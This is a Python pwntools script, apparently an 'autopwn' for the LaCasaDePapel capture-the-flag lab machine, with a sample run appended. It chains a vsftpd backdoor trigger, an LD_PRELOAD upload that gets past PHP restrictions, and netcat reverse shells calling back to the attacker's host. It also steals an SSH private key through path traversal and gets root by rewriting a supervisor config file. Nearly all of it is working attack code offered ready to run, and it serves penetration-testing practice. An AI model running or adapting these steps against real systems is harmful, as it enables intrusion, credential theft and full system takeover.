#!/usr/bin/env python2
# Author: Alamot
import os
import time
import fcntl
import base64
from pwn import *


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode())
    )[20:24])


LHOST = get_ip_address("tun0")
LPORT1 = 60000
LPORT2 = 60001
RHOST = "10.10.10.131"
RPORT = 6200
FTP_PORT = 21
BUF_SIZE = 500
TIMEOUT = 60
SSH_BIN_LOCAL_PATH = "/usr/bin/ssh"
CHANKRO_HOOK64_FILE = "hook64.so"
REMOTE_PATH = "/tmp/"
REV_SHELL = "/usr/bin/nc " + LHOST + " " + str(LPORT1) + " -e /bin/sh"
#This works too: REV_SHELL = "#!/bin/bash\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc " + LHOST + " " + str(LPORT1) + " >/tmp/f"


print("What shell do you want?")
print("[1] dali@lacasadepapel")
print("[2] professor@lacasadepapel")
print("[3] root@lacasadepapel")
print("[4] Exit")
response = None
while response not in ["1", "2", "3", "4"]:
    response = raw_input("Please enter a number 1-4: ").strip()
if response == "4":
    sys.exit()
    
try:
    log.info("Attempting to trigger backdoor ...")
    ftp_conn = remote(RHOST, FTP_PORT)
    # Attempt to login to trigger backdoor
    ftp_conn.sendline("USER letmein:)")
    ftp_conn.sendline("PASS please")
    log.info("Triggered backdoor")
except Exception:
    log.error("Failed to trigger backdoor.")

time.sleep(1)

try:
    r = remote(RHOST, str(RPORT))
except Exception:
    log.error("Failed to connect to " + str(RHOST) + ":" + str(RPORT))
    
r.recvuntil("Justin Hileman")
log.info("Uploading chankro.so ...")
r.sendline("$myfile = fopen('" + REMOTE_PATH + "chankro.so', 'w');")

with open(CHANKRO_HOOK64_FILE, "rb") as f:
    while True:
      data = f.read(BUF_SIZE)
      if not data:
          break
      b64data = base64.b64encode(data)
      r.sendline("fwrite($myfile, base64_decode('" + b64data + "'));")

r.sendline("fclose($myfile);")

log.info("Uploading shell payload ...")
r.sendline("file_put_contents('" + REMOTE_PATH +
           "acpid.socket', base64_decode('" + base64.b64encode(REV_SHELL) + "'));")

log.info("Bypassing PHP restrictions ...")
r.sendline("putenv('CHANKRO="  + REMOTE_PATH + "acpid.socket');")
r.sendline("putenv('LD_PRELOAD="  + REMOTE_PATH + "chankro.so');")
r.sendline("mail('a','a','a','a');")
dali_shell = listen(LPORT1, timeout=TIMEOUT).wait_for_connection()

if response == "1":
    dali_shell.sendline("whoami")
    dali_shell.interactive()
    sys.exit()

log.info("Getting berlin's private key ...")
dali_shell.sendline("curl -s http://127.0.0.1:8000/file/Li4vLnNzaC9pZF9yc2E=")
dali_shell.recvuntil("-----BEGIN OPENSSH PRIVATE KEY-----")
id_rsa_data = dali_shell.recvuntil("-----END OPENSSH PRIVATE KEY-----")
id_rsa_key = "-----BEGIN OPENSSH PRIVATE KEY-----" + id_rsa_data + "\n"
with open("berlin_id_rsa", "wt") as f:
    f.write(id_rsa_key)
os.chmod("berlin_id_rsa", 0o600)

log.info("Login via SSH as professor ...")
# We use an ssh process to connect because pwntools ssh tube uses the paramiko module (which is incompatible with our private key format).
professor_shell = process([SSH_BIN_LOCAL_PATH, "-tt", "-i", "berlin_id_rsa", "professor@"+RHOST], stdin=PTY)

time.sleep(1)

if response == "2":
    professor_shell.sendline("whoami")
    professor_shell.interactive()
    sys.exit()

log.info("Escalating to root via memcached.ini ...")
professor_shell.sendline("mv -f /home/professor/memcached.ini /home/professor/memcached.ini.orig")
professor_shell.sendline("printf '[program:memcached]\ncommand = sudo -u root /usr/bin/nc " + LHOST + " " + str(LPORT2) + " -e /bin/sh\n' > /home/professor/memcached.ini")
root_shell = listen(LPORT2, timeout=TIMEOUT).wait_for_connection()
root_shell.sendline("whoami")
root_shell.interactive()


'''
$ ./autopwn_lacasadepapel.py 
What shell do you want?
[1] dali@lacasadepapel
[2] professor@lacasadepapel
[3] root@lacasadepapel
[4] Exit
Please enter a number 1-4: 3
[*] Attempting to trigger backdoor ...
[+] Opening connection to 10.10.10.131 on port 21: Done
[*] Triggered backdoor
[+] Opening connection to 10.10.10.131 on port 6200: Done
[*] Uploading chankro.so ...
[*] Uploading shell payload ...
[*] Bypassing PHP restrictions ...
[+] Trying to bind to 0.0.0.0 on port 60000: Done
[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.131 on port 38127
[*] Getting berlin's private key ...
[*] Login via SSH as professor ...
[+] Starting local process '/usr/bin/ssh': pid 17044
[*] Escalating to root via memcached.ini ...
[+] Trying to bind to 0.0.0.0 on port 60001: Done
[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.131 on port 41479
[*] Switching to interactive mode
root
$  
'''
